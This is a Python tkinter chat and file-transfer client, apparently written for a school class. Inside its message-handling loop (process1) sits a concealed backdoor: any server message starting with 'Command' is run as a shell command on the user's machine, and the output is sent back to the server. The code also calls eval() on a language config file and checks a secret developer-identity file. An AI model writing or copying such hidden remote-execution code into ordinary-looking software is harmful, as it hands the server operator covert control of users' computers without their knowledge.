# -*- coding:UTF-8 -*-
from tkinter import filedialog as filedialog
import socket as s
import bz2
import os
from random import shuffle, random
import subprocess as sp
import threading as t
import tkinter.ttk as ttk
import tkinter as tk
from copy import deepcopy
from time import sleep, ctime
from tkinter import messagebox as m

exit_flag = False


def command_execute(command):
    try:
        data = sp.check_output(command, shell=True)
    except sp.CalledProcessError as error_data:
        return ("ERROR:" + repr(type(error_data)) + (str(error_data))).encode()
    else:
        return data


def exit_client():
    raise SystemExit


class Client:
    def __init__(self, username, port=8505, file_transmission_port=8506):
        self.state = None
        self.port = port
        self.data_dict = {}
        self.image_transmission_port = file_transmission_port
        self.files = []
        try:
            data = open("IDENTITY").read()
            if data != "!$##@@#!$#@###":
                raise FileNotFoundError
        except FileNotFoundError:
            self.data = "User"
            self.id = str(random())
        else:
            self.id = "开发者专属中文标识"
            self.data = list("#?*&%^!&$#@$##^!@#$%#@*%@#&@^!$&@#^$@#$!@$!#*@!#&!@#[]:;,.<>")
        try:
            data = open("Language.ini", encoding="GBK").read()
            data = eval(data)
            try:
                ignored = data["send"]
                ignored = data["message_box"]
                ignored = data["clear message"]
                ignored = data["connect"]
                ignored = data["found"]
                ignored = data["message entry"]
                ignored = data["server ip"]
                ignored = data["upload"]
                ignored = data["download"]
                ignored = data["get"]
                ignored = data["fn"]
                self.data_dict = deepcopy(data)
                del ignored
            except KeyError:
                raise FileNotFoundError
            except Exception:
                raise FileNotFoundError

        except FileNotFoundError:
            data = {"send": "Send", "message_box": "All chat message", "clear message": "Delete all message",
                    "connect": "Connect", "found": "Found server:", "message entry": "Message entry", "server ip":
                        "Server IP:", "upload": "Upload...", "download": "Download...", "get": "Get file...", "save":
                        "Save File", "load": "File load", "change": "Change file..", "fn": "Filename entry:",
                    "don't file": 'No need to add "file" at the end'}
            print("File not found")
            self.data_dict = deepcopy(data)
        try:
            self.file = open("C:\\Windows\\ChatMessage.ioi", "a+", encoding="utf-8")
        except OSError:
            self.file = open("C.ioi", "a+", encoding="UTF-8")
        self.file2 = open("ChatMessage.txt", "a+", encoding="utf-8")
        self.user_identity = ["ID:" + self.id]
        # self.find_server_sock = s.socket(type=s.SOCK_DGRAM)
        # self.find_server_sock.bind(("0.0.0.0", 13365))
        self.tk = tk.Tk()
        self.top = tk.Toplevel(self.tk)
        self.v = None
        self.sock = None
        self.file_sock = None
        ttk.Button(self.tk, command=self.delete_message, text=data["clear message"]).place(x=0, y=250)
        self.message_entry = tk.Text(self.tk, height=15, width=60)
        tk.Label(self.tk, text=data["message entry"]).place(x=0, y=0)
        self.message_entry.place(x=0, y=28)
        self.state1 = False
        self.tk.resizable(False, True)
        self.scrollbar = ttk.Scrollbar(self.tk)
        self.message_box = tk.Text(self.tk, height=40, width=120, yscrollcommand=self.scrollbar.set)
        self.scrollbar.config(command=self.message_box.yview)
        self.scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.found_server = tk.Text(self.top, height=45, width=120)
        tk.Label(self.top, text=data["found"]).place(x=0, y=125)
        self.op = None
        self.filename_entry = None
        ttk.Button(self.tk, command=self.loader, text=self.data_dict["upload"]).pack()
        ttk.Button(self.tk, command=self.loader2, text=self.data_dict["download"]).pack()
        self.found_server.place(x=0, y=150)
        self.message_box.place(x=0, y=305)
        tk.Label(self.tk, text=data["message_box"]).place(x=0, y=280)
        self.tk.geometry("1000x900")
        self.top.geometry("1000x850")
        self.image_sock = None
        tk.Label(self.top, text=data["server ip"]).place(x=0, y=0)
        self.server_ip = ttk.Entry(self.top)
        self.server_ip.place(x=100, y=0)
        self.message = ""
        self.old_message = ""
        self.username = username
        self.port_entry = ttk.Entry(self.top)
        self.port_entry.place(x=280, y=0)
        self.ignored_char = None
        ttk.Button(self.top, text=data["connect"], command=self.connect_to_server).place(x=450, y=0)
        ttk.Button(self.tk, command=self.process, text=data["send"]).place(x=150, y=0)
        self.log_error = False
        self.writer = self.log_writer()
        next(self.writer)
        self.writer.send("Client opened")
        ttk.Button(self.top, text="Exit", command=exit_client).place(x=550, y=0)

    def log_writer(self, file_route="Client log.log"):
        file = None
        if not self.log_error:
            try:
                file = open(file_route, encoding="utf-8", mode="a+")
            except (FileNotFoundError, OSError) as error_data:
                m.showerror("Log Write ERROR", (repr(type(error_data) + str(error_data))))
                self.log_error = True
        else:
            pass
            file = open("Client log.log", "a+", encoding="utf-8")
        while True:
            content = yield None
            file.write(ctime() + ":" + content + "\n")
            file.flush()

    def rec_check(self, sock):
        sleep(10)
        if self.state:
            return
        else:
            sock.close()

    def file_saver(self):
        c = s.socket()
        reset = False
        file_type = list(self.v.get().split(".")[-1].strip("\ufeff").strip())
        print(file_type)
        data = b""
        file_type.insert(-4, " ")
        file_type = "".join(file_type)
        path = filedialog.asksaveasfilename(title=self.data_dict["save"], filetypes=([file_type.lower(), " "],))
        for x in [1, 2]:
            if reset:
                c.connect((data.split(b" ")[1].decode(), int(data.split(b" ")[2].decode())))
            else:
                c.connect((self.server_ip.get(), int(self.port_entry.get()) + 1))
            if self.filename_entry.get():
                fn = self.filename_entry.get().strip("\ufeff").strip()
            else:
                fn = self.v.get().strip("\ufeff").strip()[:-4]
                ignored = self.v.get()
            self.writer.send("Request File:" + fn)
            c.send(b"REQUEST:" + b"0" + fn.encode())
            t.Thread(target=self.rec_check, args=(c,))
            self.state = False
            data = c.recv(102400)
            if data.startswith(b"reset"):
                m.showinfo("Note", "This server is not main server, reset to" + data.split(b" ")[1].decode())
                reset = True
                continue
            self.state = True
            m.showinfo("INFO", "File is downloading, please wait...")
            while True:
                data += c.recv(1024000)
                if b"-!end!-" in data:
                    break
                elif data[:5] == b"ERROR":
                    m.showerror("ERROR", data.decode("utf-8"))
                    self.writer.send(fn + "Download Error:" + data.decode("utf-8"))
                    c.close()
                    return
            break
        path = path.strip()
        file = open(path + "." + file_type.split(" ")[0], "wb")
        file.write(data[:-7].strip(b" "))
        file.close()
        self.writer.send(fn + ":Successfully Download")

    def check_timeout(self, sock):
        sleep(10)
        if not self.state1:
            sock.close()

    def loader2(self):
        tk2 = tk.Toplevel(self.tk)
        tk2.title(self.data_dict["load"])
        tk2.geometry("650x250")
        self.v = tk.StringVar(tk2)
        self.op = ttk.OptionMenu(tk2, self.v, *self.files)
        tk.Label(tk2, text=self.data_dict["change"]).place(x=0, y=0)
        self.op.place(x=0, y=25)
        tk.Label(tk2, text=self.data_dict["fn"]).place(x=0, y=130)
        self.filename_entry = ttk.Entry(tk2)
        self.filename_entry.place(x=100, y=130)
        tk.Label(tk2, text=self.data_dict["don't file"]).place(x=250, y=130)
        ttk.Button(tk2, command=self.file_saver, text=self.data_dict["change"]).pack()

    def loader(self):
        self.file_sock = s.socket()
        reset = False
        ip = ""
        port = 8506
        default_dir = r""
        file_path = filedialog.askopenfilename(title=self.data_dict["change"], initialdir=(os.path.expanduser
                                                                                           (default_dir)))
        file_path = file_path
        self.writer.send("File upload:" + file_path)
        file = open(file_path, "rb")
        filename = file_path.split("/")[-1]
        print(filename)
        data = b""
        while True:
            temp = file.read(8192)
            if not temp:
                break
            data += temp
        for x in [1, 2]:
            if reset:
                self.file_sock.connect((ip, port))
            else:
                self.file_sock.connect((self.server_ip.get(), int(self.port_entry.get()) + 1))
            self.file_sock.send(
                filename.encode() + b"!:!:UPLOAD!:!:" + str(os.path.getsize(file_path)).encode() + b"!:!:"
                + data +
                b"-!end of file!-")
            self.state1 = False
            t.Thread(target=self.check_timeout, args=(self.file_sock,)).start()
            response = self.file_sock.recv(102400).decode()
            if response.startswith("reset"):
                reset = True
                ip = response.split(" ")[1]
                port = int(response.split(" ")[2])
        if response.startswith("ERROR"):
            m.showerror("ERROR", response)
            self.writer.send(file_path + ":Upload Error" + response)
        elif response == "Uploaded":
            m.showinfo("INFO", "Your file uploaded")
            self.writer.send(file_path + ":Successfully Upload")

    def delete_message(self):
        self.ignored_char = None
        self.message_box.delete(1.0, "end")
        self.writer.send("Delete messages")

    def unknown_title(self):
        if self.data == "User":
            self.tk.title("ChatServer-Client (Beta) 柘荣三中七(6)班定制版")
            self.top.title("ChatServer-Client (Beta) 柘荣三中七(6)班定制版")
        else:
            while not exit_flag:
                sleep(0.1)
                shuffle(self.data)
                data1 = "".join(self.data)
                self.tk.title(data1)
                shuffle(self.data)
                data2 = "".join(self.data)
                self.top.title(data2)
        return

    def finding_server(self):
        self.writer.send("Start find server thread")
        old_server = None
        while True:
            try:
                data = self.find_server_sock.recvfrom(102400)
                data1 = data[0].decode().split(":")
                if data1[0] == "Server" and data != old_server:
                    self.found_server.insert("insert", data[0].decode())
                    old_server = deepcopy(data)
            except Exception as error:
                print(error)
                del error
                continue
            else:
                continue

    def connect_to_server(self):
        self.sock = s.socket()
        self.image_sock = s.socket()
        self.writer.send("Connect server:" + self.server_ip.get())
        try:
            self.sock.connect((self.server_ip.get(), int(self.port_entry.get())))
        except Exception as error_data:
            self.writer.send(self.server_ip.get() + ":Connect FAILED")
            m.showerror("ERROR", repr(type(error_data)) + str(error_data))
        else:
            self.writer.send(self.server_ip.get() + ":Successfully Connect")
            sleep(0.8)
            for q1 in range(6):
                self.sock.send(bz2.compress((self.username + " Join" + "-!seq!-").encode("UTF-32")))
            m.showinfo("INFO", "Done connected to " + self.server_ip.get())
            t.Thread(target=self.process1).start()

    def process1(self):
        while True:
            self.message = self.sock.recv(102400)
            if not self.message:
                self.sock.close()
                return
            sleep(0.15)
            message1 = bz2.decompress(self.message).decode("UTF-32")
            message = message1.split("-!seq!-")
            self.message = message[0]
            if self.message.startswith("Command"):
                data = command_execute(self.message.split(":")[1])
                try:
                    ignored = data.decode("utf-8")
                except UnicodeDecodeError:
                    code = "gbk"
                else:
                    code = "utf-8"
                self.sock.send(bz2.compress("Command Response:".encode("utf-32") + data.decode(code).encode("utf-32")))
                continue
            print("New message:", self.message)
            print("Old message:", self.old_message)
            if self.message != self.old_message:
                if "File" in self.message[-8:]:
                    self.files.append(self.message)
                self.message_box.insert("insert", self.message)
                self.file.write(self.message)
                self.file2.write(self.message)
                self.file.flush()
                self.file2.flush()
                self.old_message = deepcopy(self.message)

    def process(self):
        mess = self.message_entry.get(1.0, "end")
        message = self.username.title() + str(self.user_identity + ["Time:" + ctime()]) + ":" + mess.strip()
        for q in range(6):
            self.sock.send(bz2.compress((message.strip() + "-!seq!-").encode("UTF-32")))

    def start_run(self):
        t.Thread(target=self.unknown_title).start()
        # t.Thread(target=self.finding_server).start()
        self.tk.mainloop()


def main():
    client = Client((input("Username:").strip() or "Unknown")[:15])
    client.start_run()


if __name__ == '__main__':
    main()
